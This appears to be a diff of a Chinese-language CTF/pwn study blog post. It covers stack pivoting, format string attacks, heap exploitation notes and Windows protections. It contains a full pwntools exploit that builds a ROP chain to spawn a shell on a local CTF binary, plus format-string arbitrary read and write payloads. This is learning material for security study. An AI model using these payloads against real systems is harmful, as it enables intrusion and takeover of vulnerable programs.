-<p>可以用<code>0x804859c9</code>处的指令构造一个<code>read</code>函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop esi;</span><br><span class="line">pop edi;</span><br><span class="line">pop ebp;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>
-
-<p>然后用<code>0x08048564</code>的指令将esp指针也给转移到新的可读可写的内存地址<code>0x804a560</code>，可以上面写100个字节的ROP链</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop ecx;</span><br><span class="line">pop ebx;</span><br><span class="line">pop ebp;</span><br><span class="line">lea esp, [ecx-4];</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>
-
-<p>之后再做一次跳转，就完成了我们的栈转移</p>
-<p>完整exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pivoting&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x80485F0</span></span><br><span class="line">system_plt = <span class="number">0x8048370</span></span><br><span class="line">read_plt = <span class="number">0x8048340</span></span><br><span class="line">all_addr = <span class="number">0x804A060</span></span><br><span class="line">leave_addr = <span class="number">0x8048425</span></span><br><span class="line">pop_esi_edi_ebp_ret = <span class="number">0x080485c9</span></span><br><span class="line"><span class="comment"># pop ecx; pop ebx; pop ebp; lea esp, [ecx - 4]; ret;</span></span><br><span class="line">pop_ecx_ebx_ebp_lea_esp_ret = <span class="number">0x08048564</span></span><br><span class="line">all_slide_bss = <span class="number">0x804a560</span></span><br><span class="line"></span><br><span class="line">payload1 = p32(read_plt) + p32(pop_esi_edi_ebp_ret) + p32(<span class="number">0</span>) + p32(all_slide_bss) + p32(<span class="number">100</span>)</span><br><span class="line">payload1 += p32(pop_ecx_ebx_ebp_lea_esp_ret) + p32(all_slide_bss + <span class="number">4</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;b&#x27;</span> * <span class="number">10</span> + p32(all_addr + <span class="number">4</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = p32(system_plt) + <span class="string">b&quot;aaaa&quot;</span> + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210112734815.png" alt="image-20211210112734815"></p>
-<p>其实中间还有很多细节没有搞懂，再到实战再搞懂吧</p>
-<hr>
-<p>漏洞实际利用参考</p>
-<p><a href="https://4xwi11.github.io/posts/a89e21c0/#pwn-pivoting">N3CTF-pivoting</a></p>
-<p><a href="https://4xwi11.github.io/posts/7744a72a/#game">2021湖湘杯的game</a></p>
-<h2 id="0x103-格式化字符串"><a href="#0x103-格式化字符串" class="headerlink" title="0x103 格式化字符串"></a>0x103 格式化字符串</h2><p>在输出的时候直接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(value)</span><br></pre></td></tr></table></figure>
-
-<p>格式化字符串漏洞：</p>
+<p>而且value是用户可以控制的，那就存在格式化字符串漏洞：</p>
 <p>由于<code>printf</code>函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作</p>
-<p>可以在调试的时候输入，读取距离栈顶第n个栈中的值并以十六进制的形式打印出来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%n$x</span><br></pre></td></tr></table></figure>
+<p>可以在调试的时候输入，读取距离<strong>栈顶</strong>第n个栈中的值并以十六进制的形式打印出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%n$x</span><br></pre></td></tr></table></figure>
 
-<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%n</span><br><span class="line">%hn</span><br><span class="line">%hn</span><br></pre></td></tr></table></figure>
+<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>既然可以泄漏栈上的内容，那么可不可以泄漏其他任意地址的内容呢？</p>
+<p>答案是肯定的，<code>%s</code>的本质是读取对应的参数，并作为指针解析，获取到对应地址的<strong>字符串</strong>并输出；将上述的x换成s，就可以实现任意地址读</p>
+<p>攻击流程如下</p>
+<ol>
+<li>确定相对偏移：通过<code>%x</code>找到我们输入的字符串是从栈中的第几个开始的</li>
+<li>将相应位置作为参数输入</li>
+</ol>
+<p>payload的形式如下，可以实现对任意地址<code>_addr</code>内容的输出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(_addr) + <span class="string">b&quot;%num$s&quot;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 偏移是7，将0x08048010地址的内容修改为0x10203040</span></span><br><span class="line">payload = fmtstr_pay(<span class="number">7</span>,&#123;<span class="number">0x08048010</span>:<span class="number">0x10203040</span>&#125;)</span><br></pre></td></tr></table></figure>
+<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>将用到一个新的格式化字符<code>%n</code></p>
+<ul>
+<li>%n：一次写入4个字节</li>
+<li>%hn：一次写入2个字节</li>
+<li>%hhn：一次写入1个字节</li>
+</ul>
+<p>举个🌰</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ABC%nEFG%n\n&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%123c%n\n&quot;</span>, <span class="string">&#x27;a&#x27;</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d b=%d c=%d\n&quot;</span>, a, b, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211216204901420.png" alt="image-20211216204901420"></p>
+<p>正如上图运行结果所示，<code>%n</code>会将前面内容的字节数赋值给后面对应地址指向的内存，并且可以通过<code>%numc%n</code>来简便写更长字节的数据。但这样显然是不合理的，如果需要更改的数值很大，则需要输入很长的数据，这对于程序而言往往是不允许的（上图的a前有122个空格）。不过我们可以利用<code>%hhn</code>一个字节一个字节地修改</p>
+<p>比如想要修改<code>0x08048010</code>地址的内容修改为<code>0x10203040</code>：（感觉还是挺大的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;\x00\x80\x04\x08</span></span><br><span class="line"><span class="string">   \x01\x80\x04\x08</span></span><br><span class="line"><span class="string">   \x02\x80\x04\x08</span></span><br><span class="line"><span class="string">   \x03\x80\x04\x08</span></span><br><span class="line"><span class="string">   %48c%7$hhn</span></span><br><span class="line"><span class="string">   %240c%8$hhn</span></span><br><span class="line"><span class="string">   %240c%9$hhn</span></span><br><span class="line"><span class="string">   %240c%10$hhn&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>pwntools简便了上述操作，payload的形式如下，可以实现对任意地址<code>_addr</code>内容的写入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(num, &#123;x_addr:str_addr&#125;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>num是偏移</li>
+<li>x_addr是目标地址</li>
+<li>str_addr是要求成的内容</li>
+</ul>
+<h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><p>当然都可以任意地址读写，就不必拘泥于题目条件，我们可以直接读函数的真实地址好吧，所以如果没有后门函数，那就回到<code>ret2libc</code>了</p>
+<h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3><ol>
+<li>在该使用格式化的地方坚决使用格式化</li>
+<li>用其他输出函数替代，比如write和puts等</li>
+<li>使用检查工具</li>
+<li>…</li>
+</ol>
+<p>格式化字符串的两种攻击在下面这个例题中都可以得到应用</p>
 <h2 id="0x104-堆溢出"><a href="#0x104-堆溢出" class="headerlink" title="0x104 堆溢出"></a>0x104 堆溢出</h2><h3 id="glibc内存管理"><a href="#glibc内存管理" class="headerlink" title="glibc内存管理"></a>glibc内存管理</h3><h4 id="mian-arena-与-no-main-arena"><a href="#mian-arena-与-no-main-arena" class="headerlink" title="mian_arena 与 no_main_arena"></a>mian_arena 与 no_main_arena</h4><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><p>使用中的chunk结构</p>
 <p>Size of pre_chunk（$\leftarrow$Chunk指针</p>
 <p>Size of chunk，in bytes A/M/P====&gt;是否为我们的主分配区/是否是mmap分配/pre_chunk空闲或使用中（$\leftarrow$Mem指针</p>
@@ -615,12 +542,39 @@
 <p>可以使得uaf的chunk指向p=p-3</p>
 <p>修改思路：</p>
 <ol>
-<li><p>修改fd为p-3</p>
+<li>修改fd为p-3</li>
+<li>修改bk为p-2</li>
+</ol>
+<h3 id="heap-extend-and-overlapping"><a href="#heap-extend-and-overlapping" class="headerlink" title="heap extend and overlapping"></a>heap extend and overlapping</h3><h3 id="fast-bin-attack"><a href="#fast-bin-attack" class="headerlink" title="fast bin attack"></a>fast bin attack</h3><h2 id="Pwn进阶"><a href="#Pwn进阶" class="headerlink" title="Pwn进阶"></a>Pwn进阶</h2><h3 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h3><p>poc代码</p>
+<h3 id="tcache-corruption"><a href="#tcache-corruption" class="headerlink" title="tcache corruption"></a>tcache corruption</h3><h3 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h3><h3 id="Top-chunk-attack"><a href="#Top-chunk-attack" class="headerlink" title="Top chunk attack"></a>Top chunk attack</h3><h3 id="hijack-stdout"><a href="#hijack-stdout" class="headerlink" title="hijack stdout"></a>hijack stdout</h3><h3 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h3><h3 id="kernel-基础"><a href="#kernel-基础" class="headerlink" title="kernel 基础"></a>kernel 基础</h3><h3 id="UAF-1"><a href="#UAF-1" class="headerlink" title="UAF"></a>UAF</h3><h3 id="hijack-SEH"><a href="#hijack-SEH" class="headerlink" title="hijack SEH"></a>hijack SEH</h3><h4 id="Windows-pwn的环境准备"><a href="#Windows-pwn的环境准备" class="headerlink" title="Windows pwn的环境准备"></a>Windows pwn的环境准备</h4><ol>
+<li><p>Windows虚拟机</p>
 </li>
-<li><p>修改bk为p-2</p>
+<li><p>IDA（attach动调）</p>
+</li>
+<li><p>Windbg（windows内部ddl符号）</p>
+</li>
+<li><p>winserver流重定向工具（将exe程序重定向到指定端口后能被nc链接，就是在本地建服务自己撸好吧</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ex-Origin/win_server.git">https://github.com/Ex-Origin/win_server.git</a></p>
 </li>
 </ol>
-<h2 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h2><h2 id="gdb调试-amp-pwngdb插件"><a href="#gdb调试-amp-pwngdb插件" class="headerlink" title="gdb调试 &amp; pwngdb插件"></a>gdb调试 &amp; pwngdb插件</h2><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h4 id="栈溢出ROP链打不通之libc-2-27-so🐕都不用"><a href="#栈溢出ROP链打不通之libc-2-27-so🐕都不用" class="headerlink" title="栈溢出ROP链打不通之libc-2.27.so🐕都不用"></a>栈溢出ROP链打不通之<code>libc-2.27.so</code>🐕都不用</h4><p>Fr.<a target="_blank" rel="noopener" href="https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2">https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2</a></p>
+<h4 id="Windows保护机制"><a href="#Windows保护机制" class="headerlink" title="Windows保护机制"></a>Windows保护机制</h4><p>Windows安全中心$\rightarrow$应用和浏览器控制$\rightarrow$Exploit Projection</p>
+<p><img data-src="G:\4XWi11\source_posts\pwnTree.assets\image-20220104132323887.png" alt="image-20220104132323887"></p>
+<p>用winchecksec查看，Fr.<a target="_blank" rel="noopener" href="https://github.com/trailofbits/winchecksec/releases/tag/v3.0.2">https://github.com/trailofbits/winchecksec/releases/tag/v3.0.2</a></p>
+<p>以下两个是地址随机数，和Linux的pie类似；注意就算编译的时候关闭，如果操作系统强制开启，实际运行的时候还是会开启该保护</p>
+<ul>
+<li>Dynamic Base</li>
+<li>ASLR</li>
+<li>NX/DEP 堆栈保护，与Linux下的一样，绕过可以调用VirtualProtect函数</li>
+<li>SEH异常处理链，链表结构</li>
+<li>CGF（Control Flow Guard），gadget失效，只能调用完整的函数</li>
+<li>SafeSEH</li>
+<li>GS stack cookie，类似于linux下的canary</li>
+</ul>
+<h4 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h4><p>Structured Exception Handling，结构优化处理，是Windows上用来处理异常的一种机制</p>
+<p>也就是C语言__try__finally和__try__except的底层原理</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_try &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">_except () &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xffe-TASK"><a href="#0xffe-TASK" class="headerlink" title="0xffe TASK"></a>0xffe TASK</h2><h2 id="0xfff-其他"><a href="#0xfff-其他" class="headerlink" title="0xfff 其他"></a>0xfff 其他</h2><h4 id="栈溢出ROP链打不通之libc-2-27-so🐕都不打"><a href="#栈溢出ROP链打不通之libc-2-27-so🐕都不打" class="headerlink" title="栈溢出ROP链打不通之libc-2.27.so🐕都不打"></a>栈溢出ROP链打不通之<code>libc-2.27.so</code>🐕都不打</h4><p>Fr.<a target="_blank" rel="noopener" href="https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2">https://gmabru.yuque.com/iw46u7/zt2b1i/wa0rp2</a></p>
 <p>由于<code>libc-2.27.so</code>存在栈不平衡的情况（这个我不知道怎么解释，因为我是一只玛卡巴卡），当你精心构造的payload觉得没有什么问题，但就是打不通时，检查libc版本是否是2.27，是则对照是否符合下面几种情况并进行调整</p>
 <ol>
 <li><p>执行<code>system(&quot;/bin/sh&quot;)</code></p>
@@ -658,7 +612,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://4xwi11.github.io/posts/7769d5fe/" title="pwnSkillTree">https://4xwi11.github.io/posts/7769d5fe/</a>
+      <a href="https://4xwi11.github.io/posts/7769d5fe/" title="Pwn-TopologyTree">https://4xwi11.github.io/posts/7769d5fe/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -734,7 +688,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">15:10</span>
+    <span title="站点阅读时长">15:23</span>
   </span>
 </div>
 <div class="busuanzi-count">
